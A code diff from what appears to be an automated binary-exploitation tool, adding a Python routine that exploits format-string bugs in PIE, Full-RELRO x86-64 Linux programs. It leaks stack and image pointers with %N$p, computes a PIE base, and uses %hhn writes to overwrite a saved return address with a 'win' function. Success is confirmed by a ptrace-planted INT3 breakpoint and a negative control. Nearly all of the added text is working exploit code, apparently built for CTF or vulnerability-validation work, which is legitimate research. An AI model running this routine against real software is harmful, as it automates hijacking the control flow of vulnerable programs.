@@ -8,6 +8,7 @@ success marker. The analyst supplies what the target leaks and how success shows
 """
 from __future__ import annotations
 
+import ctypes
 import logging
 import os
 import re
@@ -1825,6 +1826,260 @@ def format_ret2win(exe, workdir, *, win_off, target_bytes, fmt_offset=None, read
                     pass
     return {"ok": False, "reason": "format-string ret2win: leaked a PIE base but no (stack ptr, delta) "
                                    "redirected control to win (frame layout? sink not looping?)"}
+
+
+# PTRACE register layout (x86-64), for the breakpoint-confirmed format ret2win below.
+class _PtRegs(ctypes.Structure):
+    _fields_ = [(n, ctypes.c_ulonglong) for n in (
+        "r15", "r14", "r13", "r12", "rbp", "rbx", "r11", "r10", "r9", "r8",
+        "rax", "rcx", "rdx", "rsi", "rdi", "orig_rax", "rip", "cs", "eflags",
+        "rsp", "ss", "fs_base", "gs_base", "ds", "es", "fs", "gs")]
+
+
+def _stack_cluster(vals):
+    """The bounds (lo, hi) of the live stack-frame region: the densest cluster of leaked high
+    pointers within a 1 MB window. ASLR-robust -- it needs no fixed address range, because stack
+    pointers sit within a few KB of each other while libc / heap pointers are far away. None when
+    fewer than two high pointers cluster."""
+    hv = sorted(v for v in vals if 0x600000000000 <= v < 0x800000000000)
+    best = (0, None)
+    for i, a in enumerate(hv):
+        j = i
+        while j < len(hv) and hv[j] - a <= 0x100000:
+            j += 1
+        if j - i > best[0]:
+            best = (j - i, (a, hv[j - 1]))
+    return best[1] if best[0] >= 2 else None
+
+
+def format_pie_ret2win_bp(exe, workdir, *, win_off, target_bytes, read_cap=255,
+                          gate_prefixes=None, loop_exit=b"q\n", base_argv=(), timeout=10.0,
+                          mem_mb=2048, deadline=None):
+    """Format-string -> ret2win on a PIE + Full-RELRO target, confirmed by an INT3 BREAKPOINT at
+    win's RUNTIME address -- sound and ALIGNMENT-INDEPENDENT, unlike a spawned-shell marker which a
+    ret2win often cannot reach because system()'s `movaps` faults on the post-ret stack alignment.
+
+    Interactive, one process under ptrace (ASLR forces same-process use):
+      leak  -- a `%N$p` dump past the format buffer; `recover_pie_base` gives the image base, and the
+               stack frame region is found by CLUSTERING the leaked high pointers (no fixed ranges).
+               A saved RETURN is a code pointer right after a saved-rbp (a stack pointer); that
+               saved-rbp's VALUE is the caller's rbp -- a directly-leaked absolute address -- so the
+               target saved return sits a fixed span BELOW it, with NO stack-base recovery needed.
+      write -- `%hhn` plants `pie_base + win_off` at (caller_rbp - k*8), swept over k; a planted INT3
+               at the runtime win address proves control reached it. A negative control (a wrong
+               value) must NOT reach -- the 0-false-confirmation guarantee.
+
+    Returns {ok, pie_base, win, target, k, gate, method} or {ok: False, reason}. x86-64 Linux;
+    best-effort (never raises). Bounded by `deadline` (time.time() units)."""
+    try:
+        return _fmt_pie_bp(exe, int(win_off), target_bytes, int(read_cap),
+                           gate_prefixes, loop_exit, list(base_argv), float(timeout),
+                           int(mem_mb), deadline)
+    except Exception:                                    # noqa: BLE001
+        observe.absorbed(_log, "format_pie_ret2win_bp failed")
+        return {"ok": False, "reason": "format ret2win (bp): internal error"}
+
+
+def _fmt_pie_bp(exe, win_off, tb, read_cap, gate_prefixes, loop_exit, base_argv, timeout,
+                mem_mb, deadline):
+    import signal as _sig
+    from . import exploit as _exploit
+    from . import fmt as _fmt
+    libc = ctypes.CDLL("libc.so.6", use_errno=True)
+    libc.ptrace.restype = ctypes.c_long
+    libc.ptrace.argtypes = [ctypes.c_long, ctypes.c_long, ctypes.c_void_p, ctypes.c_void_p]
+    TRACEME, PEEK, POKE, CONT, GETREGS = 0, 1, 4, 7, 12
+    MARK = 0x4141414141414141
+    argv = [str(a) for a in base_argv]
+    hexrx = re.compile(rb"0x[0-9a-fA-F]+|\(nil\)")
+    # gates to try to REACH the sink: nothing (the sink is the entry), then a menu selection.
+    gates = gate_prefixes or [b"", b"1\n", b"2\n", b"3\n"]
+
+    def _spawn():
+        rin_r, rin_w = os.pipe()
+        rout_r, rout_w = os.pipe()
+        pid = os.fork()
+        if pid == 0:
+            try:
+                libc.ptrace(TRACEME, 0, None, None)
+                os.dup2(rin_r, 0); os.dup2(rout_w, 1); os.dup2(rout_w, 2)
+                for fd in (rin_r, rin_w, rout_r, rout_w):
+                    os.close(fd)
+                os.execv(exe, [exe] + argv)
+            except Exception:
+                pass
+            os._exit(127)
+        os.close(rin_r); os.close(rout_w)
+        os.waitpid(pid, 0)                               # execve stop
+        libc.ptrace(CONT, pid, None, None)
+        return pid, rin_w, rout_r
+
+    def _rd(fd, t):
+        out = b""; dl = time.time() + t
+        while time.time() < dl:
+            r, _, _ = select.select([fd], [], [], 0.05)
+            if r:
+                try:
+                    d = os.read(fd, 65536)
+                except OSError:
+                    break
+                if not d:
+                    break
+                out += d
+        return out
+
+    def _cleanup(pid, rin_w, rout_r):
+        for fd in (rin_w, rout_r):
+            try:
+                os.close(fd)
+            except OSError:
+                pass
+        try:
+            os.kill(pid, _sig.SIGKILL); os.waitpid(pid, 0)
+        except OSError:
+            pass
+
+    # 1) pick the gate that reaches the sink, and calibrate the varargs offset through it.
+    gate = None; fmt_off = None
+    for g in gates:
+        if deadline and time.time() >= deadline:
+            return {"ok": False, "reason": "format ret2win (bp): deadline before gate calibration"}
+        pid, w, r = _spawn()
+        try:
+            os.write(w, g + struct.pack("<Q", MARK) + b"|"
+                     + b" ".join(b"%%%d$p" % i for i in range(1, 30)) + b"\n")
+            tk = hexrx.findall(_rd(r, 0.6))
+            fo = next((i for i, t in enumerate(tk, 1) if t == b"0x%x" % MARK
+                       or (t != b"(nil)" and int(t, 16) == MARK)), None)
+            if fo:
+                gate, fmt_off = g, fo
+                break
+        finally:
+            _cleanup(pid, w, r)
+    if fmt_off is None:
+        return {"ok": False, "reason": "format ret2win (bp): no reachable printf(user) sink "
+                                       "(tried gates: none / menu selections)"}
+
+    # Per-read width: fit a conservative slice of the sink's read (the passed read_cap is only an
+    # ESTIMATE of the target's buffer -- too small a guess would place a single window short of the
+    # saved return), then SCAN a wide position range across several reads. For a looping/menu sink
+    # (gate found) this costs only extra iterations; main's frame pointers are stable across them.
+    width = max(16, min(40, (max(read_cap, 200) - len(gate)) // 8))
+
+    def _read_window(w, r, a, b):
+        os.write(w, gate + b" ".join(b"%%%d$p" % i for i in range(a, b)) + b"\n")
+        tk = hexrx.findall(_rd(r, 0.5))
+        out = {}
+        for off, t in enumerate(tk[:b - a]):
+            if t != b"(nil)":
+                try:
+                    out[a + off] = int(t, 16)
+                except ValueError:
+                    pass
+        return out
+
+    def _wide_leak(w, r):
+        """Scan fmt_off+1 .. fmt_off+~200 across several reads and merge. Returns the merged
+        {pos: val}."""
+        items = {}
+        a = int(fmt_off) + 1
+        while a < int(fmt_off) + 200:
+            if deadline and time.time() >= deadline:
+                break
+            items.update(_read_window(w, r, a, a + width))
+            a += width
+        return items
+
+    # 1b) map the layout ONCE: a wide scan to find an image pointer (for the base) and the
+    # saved-return ADJACENCY positions (a code pointer right after a saved-rbp stack pointer).
+    pid, w, r = _spawn()
+    try:
+        items0 = _wide_leak(w, r)
+    finally:
+        _cleanup(pid, w, r)
+    base0 = _exploit.recover_pie_base(list(items0.values()), tb, allow_single=True)
+    sc0 = _stack_cluster(items0.values())
+    if not (base0 and sc0):
+        return {"ok": False, "reason": "format ret2win (bp): leak did not yield a PIE base and a "
+                                       "stack cluster (sink not reached / too narrow a read?)"}
+    in_stack0 = lambda v: sc0[0] <= v <= sc0[1]                              # noqa: E731
+    is_code0 = lambda v: (base0 <= v < base0 + 0x200000) or (               # noqa: E731
+        0x600000000000 <= v < 0x800000000000 and not in_stack0(v))
+    img_pos = next((p for p, v in sorted(items0.items()) if base0 <= v < base0 + 0x200000), None)
+    # adjacency positions; a libc-text return (NOT in the image) is main's frame -> try those first.
+    adj = [Q for Q in sorted(items0)
+           if (Q - 1) in items0 and is_code0(items0[Q]) and in_stack0(items0[Q - 1])]
+    adj.sort(key=lambda Q: 0 if not (base0 <= items0[Q] < base0 + 0x200000) else 1)
+    if not (adj and img_pos):
+        return {"ok": False, "reason": "format ret2win (bp): no saved-return adjacency found in the "
+                                       "leak (frame layout / sink shape?)"}
+
+    def _attempt(qpos, k, negate):
+        """One traced process: targeted read of an image slot + the window around `qpos` (so base and
+        the caller-rbp come from THIS process), %hhn-write win (or a wrong value) at caller_rbp-k*8,
+        confirm control reaches win's runtime address. Returns (reached, base, target) or (None,...)."""
+        pid, w, r = _spawn()
+        try:
+            a = max(int(fmt_off) + 1, qpos - 4)
+            vals = _read_window(w, r, a, a + width)       # window around the adjacency
+            # ensure we also have an image pointer for the base, reading its slot if outside window
+            if not any(base0 <= v < base0 + 0x200000 for v in vals.values()):
+                vals.update(_read_window(w, r, img_pos, img_pos + 1))
+            base = _exploit.recover_pie_base(list(vals.values()), tb, allow_single=True)
+            if not base or (qpos - 1) not in vals:
+                return (None, base, None)
+            caller_rbp = vals[qpos - 1]
+            if not (0x600000000000 <= caller_rbp < 0x800000000000):
+                return (None, base, None)
+            target = caller_rbp - k * 8
+            win_rt = base + win_off
+            wv = (win_rt ^ 0xFFFF) if negate else win_rt
+            try:
+                payload = _fmt.fmtstr_payload(int(fmt_off), {target: wv})
+            except Exception:                            # noqa: BLE001
+                return (None, base, target)
+            os.kill(pid, _sig.SIGSTOP); os.waitpid(pid, 0)
+            orig = libc.ptrace(PEEK, pid, ctypes.c_void_p(win_rt), None)
+            if orig == -1 and ctypes.get_errno() != 0:
+                return (None, base, target)
+            orig &= (1 << 64) - 1
+            libc.ptrace(POKE, pid, ctypes.c_void_p(win_rt), ctypes.c_void_p((orig & ~0xff) | 0xCC))
+            libc.ptrace(CONT, pid, None, None)
+            os.write(w, gate + payload + b"\n" + (loop_exit or b""))
+            reached = False
+            dl = time.time() + min(timeout, 3.0)
+            while time.time() < dl:
+                wp, st = os.waitpid(pid, os.WNOHANG)
+                if wp == 0:
+                    time.sleep(0.003); continue
+                if os.WIFSTOPPED(st) and os.WSTOPSIG(st) == _sig.SIGTRAP:
+                    regs = _PtRegs()
+                    if (libc.ptrace(GETREGS, pid, None, ctypes.byref(regs)) == 0
+                            and regs.rip == (win_rt + 1) & ((1 << 64) - 1)):
+                        reached = True; break
+                    libc.ptrace(CONT, pid, None, None); continue
+                if os.WIFEXITED(st) or os.WIFSIGNALED(st):
+                    break
+            return (reached, base, target)
+        finally:
+            _cleanup(pid, w, r)
+
+    # 2) for each saved-return adjacency (main's frame first), sweep the span k from its leaked
+    # caller-rbp; confirm by the INT3 breakpoint + a negative control.
+    for qpos in adj[:4]:
+        for k in range(1, 48):
+            if deadline and time.time() >= deadline:
+                return {"ok": False, "reason": "format ret2win (bp): deadline during the span sweep "
+                                               "(raise --budget)"}
+            reached, base, target = _attempt(qpos, k, negate=False)
+            if reached:
+                neg, _b, _t = _attempt(qpos, k, negate=True)
+                if not neg:
+                    return {"ok": True, "pie_base": base, "win": base + win_off, "target": target,
+                            "fmt_offset": int(fmt_off), "k": k, "gate": gate.decode("latin-1"),
+                            "method": "caller-rbp-anchor+bp"}
+    return {"ok": False, "reason": "format ret2win (bp): leaked a PIE base and a saved-return "
+                                   "adjacency, but no span reached win (frame layout?)"}
 
 
 def canary_pie_ret2libc(exe, workdir, *, target_bytes, libc_data, pop_rdi_off, system_off, binsh_off,
